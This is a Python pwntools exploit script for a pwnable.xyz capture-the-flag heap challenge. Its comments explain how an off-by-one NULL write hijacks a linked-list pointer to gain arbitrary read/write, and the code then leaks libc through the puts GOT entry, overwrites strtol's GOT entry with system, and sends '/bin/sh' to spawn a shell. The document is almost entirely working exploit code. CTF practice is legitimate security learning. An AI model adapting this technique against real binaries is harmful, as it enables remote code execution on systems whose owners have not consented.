###Off by one NULL to hijack linked_list pointer and get arbitrary read/write
###Quite interesting problem, there should be simpler ways to facilitate attack, but I took the most intuitional approach here

from pwn import *

###Structure
'''
note
    |   4   |   4   |   4   |   4   |
0x00|      size     |      idx      |
0x10|              data             |
0x20|              data             |
0x30|      data     |    next_ptr   |
'''

###Util
def create(data):
    r.sendlineafter('> ','1')
    r.sendlineafter('note: ',data)

def show(idx):
    r.sendlineafter('> ','2')
    r.sendlineafter('id: ',str(idx))
    r.recvline()
    return r.recvline()[11:-1]

def edit(idx,data):
    r.sendlineafter('> ','3')
    r.sendlineafter('id: ',str(idx))
    r.sendlineafter('note: ',data)

def leave():
    r.sendlineafter('> ','4') 

###Addr
#  libc2.24
head = 0x601708
bss = 0x601800
puts_got = 0x6014a0
puts_offset = 0x68180
strtol_got = 0x6014d8
system_offset = 0x404f0

###Exploit
r = remote('svc.pwnable.xyz',30047)

###Nudge chunks into preferred locations
create('M30W')  #0 0x00
create('M30W')  #1 0x50
create('M30W')  #2 0xa0
create('M30W')  #3 0xf0
create('M30W')  #4 0x140
create('M30W')  #5 0x190

###Interesting point here
###Since target is to construct one chunk we have complete control on bss, the ability to edit it is necessary
###However, since selecting target is done by specifying the idx of chunk, and the block on bss is bound to have idx=0
###we need to somehow remove chunk 0 from linked list before bss_fake_chunk
###Thus, we once again utilize the vtable field of stdout_struct before head pointer to hijack pointer with oof by one null
###This lets the first chunk change from heap+0x10 to heap+0x00, which has idx field pointed to chunk size=0x51
###Furthermore, the next_ptr of this chunk is at a controllable location, meaning we can hijack the entire linked list here
#  Prepare chunk for attack
create('M30W')  #6 0x1e0
create('M30W')  #7 0x230
create('M30W')  #8 0x280
#  Off by one to hijack pointer to fake block, and overwrite pointer with edit to further control linked_list_next
edit(0x6,p64(0x50)+p64(0x10101))
edit(0x7,b'\x00'*0x28)
edit(0x10101,b'\x00'*0x18+p64(head-0x13))
#  Overwrite head
edit(0x0,p64(0)*3+p64(bss+0x38))
edit(0x7f,b'\x00'*3)

###Up to this point, we already have a chunk on bss, but the size field of this chunk is 0, meaning it can't be edited yet
###To allow edit, simply perform prior attack once again to overwrite size field with next_pointer of another fake_chunk
#  Prepare chunk for attack
create('M30W')  #1 0x2d0
create('M30W')  #2 0x320
create('M30W')  #3 0x370
#  Off by one to hijack pointer to fake block, and overwrite pointer with edit to further control linked_list_next
edit(0x1,p64(0)*2+p64(0x100)+p64(0x10101))
edit(0x2,b'\x00'*0x28)
edit(0x10101,b'\x00'*8+p64(bss))
#  Write next_ptr into size field
create('M30W')  #1 0x3c0

###Now we have an editable chunk on bss, but having a chunk with idx=0 is inconvinient for further read/write
###Thus we craft a fake chunk one last time(this time with simple edit since size is set to be larger than data field)
###And point head to this crafted chunk with an idx unlikely to collide with read/write chunk idx
edit(0,b'a'*0x28+p64(head-0x13)+p64(0)+p64(0x100)+p64(0x10101))
edit(0x7f,b'\x00'*3+p64(bss+0x80))

###Finally, arbitrary read write to leak and hijack got_table to system
edit(0x10101,p64(0)*5+p64(puts_got-0x10))
puts_addr = u64(show(0)+b'\x00\x00')
libc_base = puts_addr-puts_offset
print(hex(libc_base))

edit(0x10101,p64(0)*5+p64(strtol_got-0x14))
edit(libc_base>>32,b'\x00'*4+p64(libc_base+system_offset))

r.sendlineafter('> ','/bin/sh\x00')
r.interactive()
